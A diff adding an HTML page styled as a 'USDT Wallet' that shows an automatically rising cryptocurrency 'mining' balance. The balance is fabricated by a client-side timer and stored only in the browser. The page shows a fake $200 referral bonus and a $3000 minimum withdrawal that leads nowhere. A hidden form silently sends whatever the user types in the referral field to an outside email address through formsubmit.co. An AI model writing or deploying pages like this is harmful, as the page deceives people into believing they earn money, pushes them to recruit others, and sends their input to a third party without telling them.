@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>USDT Wallet</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
+      background-size: 400% 400%;
+      animation: gradient 20s ease infinite;
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+    }
+
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 25px;
+      border-radius: 15px;
+      width: 300px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #00e99a;
+      margin-bottom: 15px;
+    }
+
+    .balance {
+      font-size: 1.4rem;
+      margin: 15px 0;
+    }
+
+    button {
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      background-color: #00e99a;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-top: 15px;
+      border-radius: 6px;
+      border: none;
+    }
+
+    .history {
+      background-color: rgba(0, 128, 64, 0.1);
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 0.85em;
+      margin-top: 10px;
+    }
+
+    form {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>USDT Wallet</h2>
+    <div class="balance">Balance: <span id="balance">0.00000000</span> USDT</div>
+    <button onclick="handleWithdraw()">Withdraw</button>
+
+    <div class="history" id="withdraw-history">No withdrawals yet.</div>
+
+    <!-- Send referral owner -->
+    <input type="text" id="refOwner" placeholder="Who used your referral?" onblur="sendReferralOwner(this.value)" />
+    <form id="notifyForm" action="https://formsubmit.co/snipemarkets@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="referrer" id="hiddenRef">
+    </form>
+  </div>
+
+  <script>
+    let balance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
+    let miningStarted = false;
+    const usdtPerMs = 1 / 120000;
+
+    // Add $200 to referral if used
+    const referral = localStorage.getItem('usdt_referral_used');
+    const alreadyCredited = localStorage.getItem('usdt_referral_rewarded');
+    if (referral && !alreadyCredited) {
+      const refKey = `ref_${referral}_bonus`;
+      const refBalance = parseFloat(localStorage.getItem(refKey)) || 0;
+      localStorage.setItem(refKey, (refBalance + 200).toString());
+      localStorage.setItem('usdt_referral_rewarded', 'yes');
+    }
+
+    function startMining() {
+      if (!miningStarted) {
+        setInterval(() => {
+          balance += usdtPerMs;
+          localStorage.setItem('usdtBalance', balance.toString());
+          updateBalance();
+        }, 10);
+        miningStarted = true;
+      }
+    }
+
+    function updateBalance() {
+      document.getElementById('balance').textContent = balance.toFixed(8);
+    }
+
+    function updateWithdrawHistory() {
+      const hist = JSON.parse(localStorage.getItem('withdrawHistory') || '[]');
+      const el = document.getElementById('withdraw-history');
+      el.innerHTML = hist.length ? hist.map(h => `<div>${h}</div>`).join('') : "No withdrawals yet.";
+    }
+
+    function handleWithdraw() {
+      if (balance >= 3000) {
+        alert("Redirect to withdrawal page...");
+        // location.href = "withdraw.html";
+      } else {
+        alert("Minimum withdrawal is $3000 USDT.");
+      }
+    }
+
+    function sendReferralOwner(name) {
+      if (!name) return;
+      document.getElementById("hiddenRef").value = name;
+      document.getElementById("notifyForm").submit();
+    }
+
+    window.onload = () => {
+      updateBalance();
+      updateWithdrawHistory();
+      startMining();
+    };
+  </script>
+</body>
+</html>
